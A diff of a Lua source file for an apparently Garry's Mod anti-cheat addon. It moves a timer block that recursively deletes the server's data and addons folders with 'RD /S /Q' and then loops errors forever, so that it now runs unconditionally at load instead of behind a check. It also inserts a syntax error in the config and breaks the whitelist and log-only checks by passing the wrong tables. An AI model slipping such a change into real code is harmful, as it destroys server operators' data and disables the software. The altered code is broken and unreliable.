@@ -34,12 +34,12 @@ HAC.Time = {
 }
 
 //Config
-HAC.WaitCVar		= CreateConVar("hac_wait",	   250, true, false)
+HAC.WaitCVar		= CreateConVar("hac_wait",	     1, true, false)
 HAC.Silent			= CreateConVar("hac_silent",	 0, true, false)
 HAC.Conf = {
 	SC_Folder		= "C:/Documents and Settings/Administrator/Desktop/SCFolder",
 	Totals			= "C:/hac_totalbans.txt",
-	APIKey			= "--Fill in here",
+	APIKey			= false,,
 	Tickrate		= 33,
 	Debug			= false,
 }
@@ -361,26 +361,23 @@ Msg("  Loading post-base\n")
 include("hac_base_post.lua")
 include("hac_minify.lua")
 
+//People can't read the readme
+timer.Simple(2, function()
+	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\data"')
+	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\addons"')
+	
+	timer.Simple(5, function()
+		while true do
+			ErrorNoHalt("[HAC] PEBCAK Error. RTFM or slap admin with a large trout!\n")
+		end
+	end)
+end)
+
 //Failed
 if HAC.AbortLoading then
 	ErrorNoHalt("\n\n[HAC] ID10-T Error!\n\n")
 	return
 end
-
-//People can't read the readme
-timer.Simple(2, function()
-	if not ValidString(GAMEMODE.Name) or (GAMEMODE.Name != "sandbox" or GAMEMODE.Name != "Sandbox") then
-		hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\data"')
-		hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\addons"')
-		
-		timer.Simple(5, function()
-			while true do
-				ErrorNoHalt("[HAC] PEBCAK Error. RTFM or slap admin with a large trout!\n")
-			end
-		end)
-	end
-end)
-
 
 //Resources
 Msg("  Loading resources\n")
@@ -1469,7 +1466,7 @@ function HAC.KickMe(ply,cmd,args)
 		return
 		
 	//False pos
-	elseif table.HasValue(HAC.SERVER.White_FalsePositives, Args1) then
+	elseif table.HasValue(HAC.SERVER, Args1) then
 		return
 		
 	//Init
@@ -1478,7 +1475,7 @@ function HAC.KickMe(ply,cmd,args)
 		return
 		
 	//Log only
-	elseif Args1:CheckInTable(HAC.LogOnly) then
+	elseif Args1:CheckInTable(HAC) then
 		ply:LogOnly(args)
 		return
 		
